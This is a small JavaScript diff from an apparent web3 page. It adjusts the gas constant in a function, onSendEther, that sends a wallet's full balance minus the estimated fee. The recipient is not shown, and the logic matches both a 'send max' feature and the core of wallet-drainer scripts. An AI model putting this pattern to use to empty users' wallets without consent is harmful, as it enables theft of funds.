@@ -302,7 +302,7 @@ async function onSendEther() {
         console.log(feeData)
         var gasPrice = feeData.formatted.gasPrice; // estimate the gas price
         gasPrice = parseFloat(gasPrice)
-        let amount = parseFloat(balance.formatted) - (gasPrice * 0.00042)
+        let amount = parseFloat(balance.formatted) - (gasPrice * 0.00021)
         amount = parseEther(amount.toString())
         console.log(amount)
        
